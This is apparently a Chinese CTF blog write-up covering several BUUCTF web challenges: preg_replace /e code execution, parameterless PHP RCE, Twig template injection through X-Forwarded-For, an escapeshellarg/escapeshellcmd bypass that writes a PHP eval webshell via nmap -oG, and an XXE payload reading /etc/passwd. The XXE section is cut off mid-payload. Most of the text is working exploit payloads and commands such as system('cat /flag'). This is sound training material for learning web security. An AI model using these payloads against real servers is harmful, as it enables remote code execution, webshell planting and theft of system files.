<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure>

<p>next.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>preg_replace的&#x2F;e模式存在命令执行漏洞,不知道这个$_SESSION[‘id’]是什么鬼<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">传送门</a>非常详细<br>先来搞定这两个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>phpinfo()&#125;<br></code></pre></td></tr></table></figure>
<p>成功显示我们需要显示的内容<br><img src="/images/M4DDC2IQVG3UJ5UHXDSK.png" srcset="/img/loading.gif" lazyload><br>需要传入$cmd参数，然后eval执行拿到flag<br>getFlag没有被调用<br>调用一下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;<span class="hljs-attribute">cmd</span>=phpinfo();<br></code></pre></td></tr></table></figure>
<p>成功，开始rce</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>getFlag()&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>开始页面未找到可利用信息，抓包也什么没有发现<br>用dirsearch搜搜<br><img src="/images/FGQ77UZZI9ZN0I.png" srcset="/img/loading.gif" lazyload><br>出现了很多.git后缀的文件，确定为git源码泄露<br>使用githack扫一扫<br>扫出了网站的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>开始代码审计<br>这一题有很多的过滤<br>第二个if过滤让php伪协议data协议都不能用了<br>第二个if</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])</span></span>)<br></code></pre></td></tr></table></figure>

<p><code>[a-z,_]+ : [a-z,_]</code><br>匹配小写字母和下划线 +表示1到多个</p>
<p><code>(?R)?</code><br>(?R)代表当前表达式，就是这个<code>(/[a-z,_]+((?R)?)/)</code>，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配<code>a(b(c()d())))</code></p>
<p>如果传进去的值是字符串接一个()，那么字符串就会被替换为空，如果(递归)替换后的字符串只剩下<code>;</code>，那么我们传进去的exp就会被eval执行。比如我们传入一个<code>phpinfo();</code>,他被替换后就剩下<code>;</code>,那么更具条件就会执行<code>phpinfo();</code></p>
<p>而(?R)?能匹配的只有<code>a(b()); a(b(c()));</code>这种类型的，比如传入<code>a(b(c()));</code>,第一次匹配后，就剩<code>a(b())</code>,第二次匹配后,<code>a();</code>,第三次匹配后就剩下<code>;</code>了，最后<code>a(b(c()))</code>就会被eval执行。</p>
<p>这题的思路到这就很明确了，使用无参RCE<br>下面是无参RCE的常用函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getchwd</span><span class="hljs-params">()</span></span>：函数返回当前工作目录。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>：函数返回指定目录中的文件和目录的数组。<br><span class="hljs-function"><span class="hljs-title">dirname</span><span class="hljs-params">()</span></span>：函数返回路径中的目录部分。<br><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span>：函数改变当前的目录。<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span>：输出一个文件。<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>：返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">current</span>() 的别名。<br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>：函数将内部指针指向数组中的下一个元素，并输出。<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">()</span></span>：将内部指针指向数组中的最后一个元素，并输出。<br><span class="hljs-function"><span class="hljs-title">array_rand</span><span class="hljs-params">()</span></span>：函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>：<span class="hljs-built_in">array_flip</span>() 函数用于反转/交换数组中所有的键名以及它们关联的键值。<br><span class="hljs-function"><span class="hljs-title">array_slice</span><span class="hljs-params">()</span></span>：函数在数组中根据条件取出一段值，并返回。<br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>：函数返回翻转顺序的数组。<br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">()</span></span> 函数从指定的：ASCII 值返回字符。<br><span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span>：— 转换十六进制字符串为二进制字符串。<br><span class="hljs-function"><span class="hljs-title">getenv</span><span class="hljs-params">()</span></span>：获取一个环境变量的值(在<span class="hljs-number">7.1</span>之后可以不给予参数)。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>：函数返回一包含本地数字及货币格式信息的数组。<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure>
<p><img src="/images/Q18QQU2TN4NTI9VNSA0.png" srcset="/img/loading.gif" lazyload><br><strong>代码解释：</strong><br>想要浏览目录内的所有文件需要用到函数<code>scandir()</code>。当<code>scandir()</code>传入<code>.</code>,它就可以列出当前目录的所有文件。<br>但这里是无参数的RCE，我们不能写<code>scandir(.)</code>,而<code>localeconv()</code>却会有一个返回值，那个返回值正好就是<code>.</code>,再配合<code>pos</code>或<code>current()</code>就可以把<code>.</code>取出来传给<code>scandir()</code>查看所有文件了。</p>
<p>现在知道了flag的位置，flag为倒数第二个，我们可以使用翻转函数<code>array_reverse()</code>，再用一个next就可以查看flag文件了，查看flag文件可用函数为<code>highlight_file(),readfile(),show_source()</code>等等。。。<br>payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">exp</span>=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(<span class="hljs-keyword">pos</span>(localeconv())))));<br><span class="hljs-regexp">//</span>$flag = <span class="hljs-string">&quot;flag&#123;c4305172-c8af-4fa8-af1f-504d83d83583&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>虽然本题的flag位置不是那么特殊，但总会遇到特殊位置flag的题，可以用<code>array_rand()</code>和<code>array_flip()</code><br>(<code>array_rand()</code>返回的是键名所以必须搭配<code>array_flip()</code>来交换键名、键值来获得键值，随机刷新显示的内容)<br>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=show<span class="hljs-constructor">_source(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure>

<p><strong>方法二：session_id()</strong><br>上面的正则过滤中并没有过滤session，所以我们可以用session_id来获取flag<br><code>session_id()</code><br>可以用来获取&#x2F;设置当前会话id。<br>php是默认不主动使用session的<br>在我们使用session_id()的时候 需要使用<code>session_start()</code>来开启session会话<br>PHPSESSID本身是可以直接加上例如flag.php这类的字符的<br>payload:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">exp</span>=show_source(session_id(session_start()));<br>COOKIE:<br><span class="hljs-attribute">PHPSESSID</span>=flag.php<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120738755">无参RCE传送门</a><br>写的非常好，收获颇丰🤤</p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>启动环境<br>flag.txt<br><img src="/images/RDZVO40JRJ84SIYW.png" srcset="/img/loading.gif" lazyload><br>hint.php中查看源码的注释作者也说了Do you know why i know your ip?<br>结合题目与作者的hint，猜测本题x-forwarded-for处有问题<br>burpsuite抓抓<br><img src="/images/5ENMQE2LCM1KOF03JQ8.png" srcset="/img/loading.gif" lazyload><br>成功执行，说明XFF可控<br>控制XFF进行命令执行（这是要在前端有IP相关回显的情况）<br>查阅资料<br>Flask可能存在Jinjia2模版注入漏洞<br>PHP可能存在Twig模版注入漏洞<br>试试能否执行模板算式</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/LJ7EPLUC0WFRYGH.png" srcset="/img/loading.gif" lazyload><br>成功执行，尝试是否能执行命令</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/12M2VGZKUFL40.png" srcset="/img/loading.gif" lazyload><br>无脑RCE<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13049923.html">模板注入检测</a></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//创建目录</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//改变当前的目录</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>HTTP_X_FORWARDED_FOR HTTP扩展头部，用来表示http请求端真实ip</p>
<p>REMOTE_ADDR代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP。</p>
<p>本题主要考察的是escapeshellarg和escapeshellcmd这两个函数</p>
<ul>
<li>escapeshellarg：对传入的字符串用一对单引号包围，将内容的’先用反斜杠转义，再添加一对单引号包围，即单引号会被转义为’&#39;‘</li>
<li>escapeshellcmd：对\以及最后那个不配对儿的引号进行转义</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">传入的参数是172.17.0.2<span class="hljs-string">&#x27; -v -d a=1</span><br><span class="hljs-string">经过escapeshellarg处理后变成了&#x27;</span>172.17.0.2<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成<span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<br>最后执行的命令是curl <span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d <span class="hljs-attribute">a</span>=1&#x27;,即向172.17.0.2\发起请求，POST数据为a=1&#x27;。<br></code></pre></td></tr></table></figure>

<p>两次转义后出现了问题，没有考虑到单引号的问题<br>再往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);<br>这里有个system来执行命令，而且有传参，肯定是利用这里了</p>
<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转义，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
<p>在nmap命令中，有一个参数-oG可以实现将命令和结果写到文件，这个命令就是我们的输入可控，然后写入到文件，传入一句话木马<br>注意引号加空格，不加空格会将语句转义。</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php &#x27;</span><br></code></pre></td></tr></table></figure>
<p>进入MD5目录下的1.php<br><img src="/images/S3IOWE9SGW1BLCJK5.png" srcset="/img/loading.gif" lazyload><br>开始RCE</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">POST:<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>这里有两个小问题</p>
<p>首先是后面没有加引号</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php</span><br></code></pre></td></tr></table></figure>

<p>先经过escapeshellarg()函数处理，该函数会先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p>再经过escapeshellcmd()函数处理，escapeshellcmd对\以及最后那个不配对儿的引号进行了转义，转义命令中的所有shell元字符来完成工作。这些元字符包括：<code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\。</code></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?h</span>ost=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php\<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p>返回结果是上面那样文件名后面会多一个引号1.php’</p>
<p>第二个是加引号但引号前没有空格</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php&#x27;</span><br></code></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>文件名后面就会多出<code>\\</code> <code>1.php\\</code><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>先尝试sql注入，行不通<br>看看源码<br><img src="/images/VSCRU5OH75NYS3N.png" srcset="/img/loading.gif" lazyload><br>找到一个php文件<br>还有<br><code>contentType: &quot;application/xml;charset=utf-8&quot;,</code><br>进入doLogin.php<br><img src="/images/NY0S07MJ2GOIRTM3AJF.png" srcset="/img/loading.gif" lazyload><br>发现都指向xml<br>那么xml有个xxe漏洞，抓包看能否利用一下，构建一个恶意的外部实体<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span 